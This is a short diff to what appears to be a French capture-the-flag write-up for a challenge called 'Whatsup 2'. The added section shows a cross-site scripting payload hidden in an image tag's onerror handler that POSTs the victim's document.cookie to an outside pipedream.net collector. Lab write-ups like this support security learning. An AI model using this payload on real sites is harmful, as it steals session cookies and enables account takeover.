@@ -31,3 +31,9 @@ Nous avons donc acceder aux messages de l'admin, d'envoyer des messages en tant 
 ```
 
 # Whatsup 2
+
+Exactement la même manipulation mais en cachant le script js dans une image.
+
+```
+src = "x " onerror ="var sdfd=['\x69'];function e(){  fetch('//eotuo54cchosrud.m.pipedream.net',{method:'POST',body:document.cookie}) }e()    "
+```
